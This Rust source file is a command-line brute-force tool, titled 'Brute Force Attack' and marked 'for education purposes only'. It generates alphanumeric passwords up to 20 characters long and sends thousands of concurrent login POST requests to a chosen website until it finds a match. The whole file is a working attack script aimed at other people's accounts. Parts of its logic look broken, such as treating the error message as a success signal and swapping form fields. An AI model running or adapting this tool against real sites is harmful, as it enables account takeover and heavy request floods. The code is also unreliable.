use chrono::prelude::*;

use itertools::Itertools;
use tokio::task::JoinHandle;

use clap::{App, Arg, SubCommand};

fn password_generator() -> impl Iterator<Item = String> {
    let charset: &str = "abcdefghijklmnopqrstuvwxyz0123456789";

    (1..=20)
        .flat_map(move |len| {
            charset
                .chars()
                .combinations_with_replacement(len)
                .map(move |combos| (combos, len))
        })
        .flat_map(|(combos, len)| combos.into_iter().permutations(len))
        .dedup()
        .map(|chars| chars.into_iter().collect())
}

async fn sending_requests<'a>(
    url: &'static str,
    username: &'static str,
    username_field: &'static str,
    password_field: &'static str,
    error_message: &'static str,
) {
    let mut request_amount = 0;
    let mut tasks: Vec<JoinHandle<Result<(), ()>>> = Vec::new();

    for password in password_generator() {
        request_amount += 1;

        tasks.push(tokio::spawn(async move {
            let fields = [(username, username_field), (password_field, &password)];

            loop {
                match reqwest::Client::new().post(url).form(&fields).send().await {
                    Ok(resp) => match resp.text().await {
                        Ok(text) => {
                            if text.contains(error_message) {
                                println!(
                                    "[{}] Correct Password: '{}'",
                                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                    &password,
                                );

                                println!(
                                    "[{}] Request Amount: {}",
                                    Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                    request_amount,
                                );
                                std::process::exit(1);
                            }

                            break;
                        }
                        Err(_) => {}
                    },
                    Err(_) => {}
                };
            }
            Ok(())
        }));

        if tasks.len() % 1000 == 0 {
            let tasks_length = tasks.len();

            println!(
                "[{}] Executing {} tasks",
                Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                &tasks_length
            );
            futures::future::join_all(tasks).await;

            tasks = Vec::new();
        }
    }
}

#[tokio::main]
async fn main() {
    let matches = App::new("Brute Force Attack")
        .author("Frolov Ivan <frolvanya@gmail.com>")
        .about("FOR EDUCATION PURPOSES ONLY")
        .arg(
            Arg::with_name("url")
                .short("u")
                .long("url")
                .value_name("URL")
                .help("Sets a website url")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("username")
                .short("l")
                .long("login")
                .value_name("USERNAME")
                .help("Sets an username")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("username_field")
                .long("username-field")
                .value_name("USERNAME_FIELD")
                .help("Sets an username field")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("password_field")
                .long("password-field")
                .value_name("PASSWORD_FIELD")
                .help("Sets a password field")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("error_message")
                .short("e")
                .long("err")
                .value_name("ERROR_MESSAGE")
                .help("Sets an authentication error message")
                .takes_value(true),
        )
        .get_matches();

    let website_url = matches.value_of("url").unwrap();
    let username = matches.value_of("username").unwrap();
    let username_field = matches.value_of("username_field").unwrap();
    let password_field = matches.value_of("password_field").unwrap();
    let error_message = matches.value_of("error_message").unwrap();

    println!(
        "[{}] Starting Brute Force Attack",
        Utc::now().format("%Y-%m-%d %H:%M:%S").to_string(),
    );

    // println!(
    //     "{} {} {} {} {}",
    //     website_url, username, username_field, password_field, error_message
    // );

    sending_requests(
        website_url,
        username,
        username_field,
        password_field,
        error_message,
    )
    .await
}
